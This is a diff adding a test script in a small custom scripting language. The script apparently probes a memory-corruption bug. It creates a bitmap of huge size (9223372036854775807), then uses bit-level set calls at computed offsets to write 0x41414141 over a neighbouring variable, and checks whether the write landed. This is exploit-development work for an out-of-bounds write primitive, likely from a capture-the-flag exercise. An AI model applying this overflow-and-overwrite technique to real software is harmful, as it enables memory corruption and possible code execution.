@@ -1,0 +1,79 @@
+print("=== Full Write Test ===");
+
+print("Step 1: Setup");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Original targetaddr:");
+print(targetaddr);
+
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 2: Write full 0x41414141 to calculated bit_index");
+int bitindex = 29888;
+int testvalue = 1094795585;
+print("Writing all 32 bits...");
+
+int bit = 0;
+while (bit < 32) {
+    int bitval = testvalue & 1;
+    set(b1, bitindex + bit, 0, bitval);
+    testvalue = testvalue / 2;
+    bit = bit + 1;
+}
+
+print("Write completed");
+
+print("Step 3: Check all variables");
+int targetcheck = target;
+print("target:");
+print(targetcheck);
+if (targetcheck == 1094795585) {
+    print("SUCCESS! target corrupted correctly!");
+}
+
+int leak1check = leak1;
+print("leak1:");
+print(leak1check);
+if (leak1check == 1094795585) {
+    print("leak1 was corrupted instead!");
+}
+
+print("Step 4: Try different bit_index offsets");
+print("Maybe we need to adjust for value_ptr offset");
+
+print("Test: bit_index - 64 (8 bytes before, might be type field)");
+testvalue = 1094795585;
+bit = 0;
+while (bit < 32) {
+    int bitval = testvalue & 1;
+    set(b1, bitindex - 64 + bit, 0, bitval);
+    testvalue = testvalue / 2;
+    bit = bit + 1;
+}
+int check1 = target;
+print("Result at bit_index - 64:");
+print(check1);
+if (check1 == 1094795585) {
+    print("SUCCESS at bit_index - 64!");
+}
+
+print("Test: bit_index + 64 (8 bytes after, might be prev pointer)");
+testvalue = 1094795585;
+bit = 0;
+while (bit < 32) {
+    int bitval = testvalue & 1;
+    set(b1, bitindex + 64 + bit, 0, bitval);
+    testvalue = testvalue / 2;
+    bit = bit + 1;
+}
+int check2 = target;
+print("Result at bit_index + 64:");
+print(check2);
+if (check2 == 1094795585) {
+    print("SUCCESS at bit_index + 64!");
+}
+
